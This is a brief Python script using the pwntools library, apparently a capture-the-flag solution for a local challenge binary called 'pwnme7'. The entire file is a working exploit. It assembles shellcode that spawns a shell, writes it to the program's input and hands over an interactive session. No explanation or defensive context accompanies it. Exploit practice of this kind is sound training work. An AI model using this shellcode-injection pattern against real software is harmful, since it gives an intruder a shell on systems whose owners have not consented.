import pwn


def main():
    proc = pwn.process("./pwnme7")
    shell_code = pwn.asm(pwn.shellcraft.sh())
    proc.sendline(shell_code)
    proc.interactive()

main()